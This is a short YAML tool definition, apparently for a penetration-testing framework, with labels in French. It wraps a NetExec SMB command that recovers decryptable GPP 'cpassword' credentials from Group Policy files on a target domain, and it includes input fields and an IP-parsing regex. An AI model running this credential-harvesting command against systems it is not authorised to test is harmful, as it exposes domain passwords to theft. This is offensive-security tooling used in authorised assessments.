id: nxc_gpp_password
name: NetExec GPP Password
category: Exploitation
description: "Récupère les mots de passe déchiffrables (cpassword) dans les fichiers GPO."
checklist_keys: ["gpp_pass"]    # <--- AJOUTER ICI
inputs:
  - name: target
    label: Cible (IP/CIDR)
    placeholder: 10.3.10.11
  - name: username
    label: Utilisateur
    placeholder: guest
  - name: password
    label: Mot de passe
    placeholder: password
command: "nxc smb {{target}} -u '{{username}}' -p '{{password}}' -M gpp_password"

parsing:
  mode: "line"
  ip_extract: "\\b(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b"